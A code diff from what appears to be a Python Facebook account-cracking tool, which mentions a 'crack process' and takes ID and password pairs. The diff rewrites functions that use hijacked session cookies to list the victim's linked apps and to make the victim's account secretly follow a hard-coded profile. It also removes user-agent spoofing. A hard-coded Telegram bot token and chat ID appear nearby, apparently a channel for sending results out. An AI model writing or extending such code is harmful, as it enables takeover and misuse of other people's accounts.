@@ -373,38 +373,6 @@ c8=f'{dot}[{H}017{M}-{H}019{M}-{H}016{M}-{H}013{M}-{H}018{M}-{H}014{M}-{H}015{P}
 mtd,cp_xdx,cokix=[],[],[]
 token = ('7298092968:AAEq1r1c0O4xpHUl8w8tiJI4C6dhfks_gvM')
 ID = ('1778046662')
-def cek_apk(session,coki):
-    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
-    sop = BeautifulSoup(w,"html.parser")
-    x = sop.find("form",method="post")
-    game = [i.text for i in x.find_all("h3")]
-    if len(game)==0:
-        print(f'\r%s[%s!%s] %sSorry there is no Active  Apk%s  '%(N,M,N,M,N))
-    else:
-        print(f'\r[🎮] %s \x1b[1;95m ☆ Your Active Apps ☆     :{WHITE}'%(GREEN))
-        for i in range(len(game)):
-            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
-        #else:
-            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
-    w=session.get("https://free.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
-    sop = BeautifulSoup(w,"html.parser")
-    x = sop.find("form",method="post")
-    game = [i.text for i in x.find_all("h3")]
-    if len(game)==0:
-        print(f'\r%s[%s!%s] %sSorry there is no Expired Apk%s           \n'%(N,M,N,M,N))
-    else:
-        print(f'\r[🎮] %s \x1b[1;95m ◇ Your Expired Apps ◇    :{WHITE}'%(M))
-        for i in range(len(game)):
-            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
-        else:
-            print('')
- 
-def follow(self, session, coki):
-        r = BeautifulSoup(session.get('https://www.facebook.com/profile.php?id=100084492703624&mibextid=ZbWKwL', {
-            'cookie': coki }, **('cookies',)).text, 'html.parser')
-        get = r.find('a', 'Ikuti', **('string',)).get('href')
-        session.get('https://free.facebook.com' + str(get), {
-            'cookie': coki }, **('cookies',)).text
 def clear():
   os.system('clear')
 import requests,os
@@ -1013,11 +981,62 @@ def xp():
   print('');print(f'{N} Hi Dear User Crack process has been completed')
   input(f'{dot}Press Enter To Go Menu');os.system('python ATOM.py')
 
-browser_version1 = (f'{random.randrange(85, 105)}.0.{random.randrange(4200, 4900)}.{random.randrange(40, 150)}')
-build1 = (''.join(random.choice('1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890') for y in range(6)))
-android_version1 = random.choice(['11', '10'])
-android_model1 = random.choice(['SM-M022G'])
-useragent = ('Mozilla/5.0 (Linux; Android {};{} Build/{}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 SamsungBrowser/7.4 Chrome/{} Mobile Safari/537.36'.format(android_version1, android_model1, build1, browser_version1))
+def cek_apk(session, coki):
+    # Check active apps
+    active_apps_response = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active", cookies={"cookie": coki})
+    active_apps_soup = BeautifulSoup(active_apps_response.text, "html.parser")
+    active_forms = active_apps_soup.find_all("form", method="post")
+    active_games = []
+    for form in active_forms:
+        game_names = form.find_all("h3")
+        for game_name in game_names:
+            active_games.append(game_name.text.strip())
+
+    if len(active_games) == 0:
+        print("\n[!] Sorry, there are no active apps.")
+    else:
+        print("\n[🎮] ☆ Your Active Apps ☆:")
+        for idx, game in enumerate(active_games, 1):
+            print(f"[{idx}] {game}")
+
+    # Check inactive apps
+    inactive_apps_response = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive", cookies={"cookie": coki})
+    inactive_apps_soup = BeautifulSoup(inactive_apps_response.text, "html.parser")
+    inactive_forms = inactive_apps_soup.find_all("form", method="post")
+    inactive_games = []
+    for form in inactive_forms:
+        game_names = form.find_all("h3")
+        for game_name in game_names:
+            inactive_games.append(game_name.text.strip())
+
+    if len(inactive_games) == 0:
+        print("\n[!] Sorry, there are no expired apps.")
+    else:
+        print("\n[🎮] ◇ Your Expired Apps ◇:")
+        for idx, game in enumerate(inactive_games, 1):
+            print(f"[{idx}] {game}")
+ 
+def follow(self, session, coki):
+    # Make a GET request to the profile page
+    profile_url = 'https://www.facebook.com/profile.php?id=100084492703624&mibextid=ZbWKwL'
+    response = session.get(profile_url, cookies={'cookie': coki})
+    
+    # Parse the HTML using BeautifulSoup
+    soup = BeautifulSoup(response.text, 'html.parser')
+    
+    # Find the link to follow
+    follow_link = soup.find('a', string='Ikuti')
+    
+    if follow_link:
+        follow_url = 'https://free.facebook.com' + follow_link.get('href')
+        
+        # Make a GET request to the follow URL
+        follow_response = session.get(follow_url, cookies={'cookie': coki})
+        
+        # Return the response text (if needed)
+        return follow_response.text
+    else:
+        return "Follow link not found"
 
 def m1(idf,pwv):
  global loop
